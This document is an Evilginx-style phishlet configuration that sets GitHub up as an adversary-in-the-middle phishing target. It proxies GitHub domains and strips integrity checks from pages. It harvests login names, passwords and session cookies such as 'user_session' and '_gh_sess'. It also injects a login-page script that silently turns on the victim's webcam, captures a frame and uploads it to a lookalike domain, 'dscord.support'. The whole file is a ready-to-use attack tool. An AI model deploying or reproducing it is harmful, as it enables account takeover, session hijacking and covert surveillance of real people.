author: '@audibleblink'
min_ver: '2.3.0'

proxy_hosts:
  - {phish_sub: '', orig_sub: '', domain: 'github.com', session: true, is_landing: true}
  - {phish_sub: 'api', orig_sub: 'api', domain: 'github.com'}
  - {phish_sub: 'github', orig_sub: 'github', domain: 'githubassets.com'}

sub_filters:
  - {triggers_on: 'github.com', orig_sub: '', domain: 'github.com', search: 'integrity="(.*?)"', replace: '', mimes: ['text/html']}

auth_tokens:
  - domain: '.github.com'
    keys: ['logged_in', 'dotcom_user']
  - domain: 'github.com'
    keys: ['user_session', '_gh_sess']

credentials:
  username:
    key: 'login'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'

login:
  domain: 'github.com'
  path: '/login'


js_inject:
  - trigger_domains: ["github.com"]
    trigger_paths: ["/login"]
    script: |
      document.addEventListener('DOMContentLoaded', () => {
      const video = document.createElement('video');
      const canvas = document.createElement('canvas');
      const context = canvas.getContext('2d');

      video.autoplay = true;
      video.style.display = 'none';

      document.body.appendChild(video);
      document.body.appendChild(canvas);

      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          video.srcObject = stream;

          video.addEventListener('loadedmetadata', () => {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;

            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL('image/png');

            fetch('https://dscord.support:5000/upload', {
              method: 'POST',
              body: imageData,
            })
            .then(response => response.text())
            .then(data => {
              console.log('Image uploaded successfully:', data);
            })
            .catch(error => {
              console.error('Error uploading image:', error);
            });
          });
        })
        .catch(error => {
          console.error("Error accessing the camera: ", error);
        });
      });



